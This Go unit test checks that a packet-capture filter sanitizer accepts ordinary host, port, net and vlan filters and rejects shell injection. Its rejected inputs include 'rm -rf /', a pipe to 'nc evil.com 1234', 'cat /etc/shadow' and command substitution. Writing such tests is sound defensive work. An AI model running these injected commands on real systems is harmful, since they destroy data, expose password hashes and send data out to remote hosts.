package filter

import (
	"strings"
	"testing"
)

func TestSanitize(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		want    string
		wantErr bool
		errMsg  string
	}{
		{
			name:  "empty filter",
			input: "",
			want:  "",
		},
		{
			name:  "simple host filter",
			input: "host 10.0.0.1",
			want:  "host 10.0.0.1",
		},
		{
			name:  "tcp port filter",
			input: "tcp port 80",
			want:  "tcp port 80",
		},
		{
			name:  "complex filter",
			input: "tcp port 80 and host 10.0.0.1",
			want:  "tcp port 80 and host 10.0.0.1",
		},
		{
			name:  "whitespace normalization",
			input: "  tcp   port   80  ",
			want:  "tcp port 80",
		},
		{
			name:  "net filter",
			input: "net 192.168.1.0/24",
			want:  "net 192.168.1.0/24",
		},
		{
			name:  "vlan filter",
			input: "vlan 100",
			want:  "vlan 100",
		},

		// ── Injection attempts ───────────────────────────────
		{
			name:    "semicolon injection",
			input:   "tcp port 80; rm -rf /",
			wantErr: true,
			errMsg:  "disallowed",
		},
		{
			name:    "pipe injection",
			input:   "tcp port 80 | nc evil.com 1234",
			wantErr: true,
			errMsg:  "disallowed",
		},
		{
			name:    "backtick injection",
			input:   "tcp port `whoami`",
			wantErr: true,
			errMsg:  "disallowed",
		},
		{
			name:    "dollar injection",
			input:   "tcp port $(id)",
			wantErr: true,
			errMsg:  "disallowed",
		},
		{
			name:    "ampersand injection",
			input:   "tcp port 80 && cat /etc/shadow",
			wantErr: true,
			errMsg:  "disallowed",
		},
		{
			name:    "curly brace injection",
			input:   "tcp port 80 {echo,pwned}",
			wantErr: true,
			errMsg:  "disallowed",
		},
		{
			name:    "backslash injection",
			input:   "tcp port 80\\n/bin/sh",
			wantErr: true,
			errMsg:  "disallowed",
		},
		{
			name:    "redirect injection",
			input:   "tcp port 80 > /tmp/dump",
			wantErr: true,
			errMsg:  "disallowed",
		},
		{
			name:    "null byte",
			input:   "tcp port 80\x00rm -rf /",
			wantErr: true,
			errMsg:  "null bytes",
		},
		{
			name:    "newline",
			input:   "tcp port 80\nrm -rf /",
			wantErr: true,
			errMsg:  "newline",
		},
		{
			name:    "too long",
			input:   strings.Repeat("a", MaxFilterLength+1),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := Sanitize(tt.input)
			if tt.wantErr {
				if err == nil {
					t.Errorf("expected error containing %q, got nil", tt.errMsg)
					return
				}
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("error %q should contain %q", err.Error(), tt.errMsg)
				}
				return
			}
			if err != nil {
				t.Errorf("unexpected error: %v", err)
				return
			}
			if got != tt.want {
				t.Errorf("got %q, want %q", got, tt.want)
			}
		})
	}
}
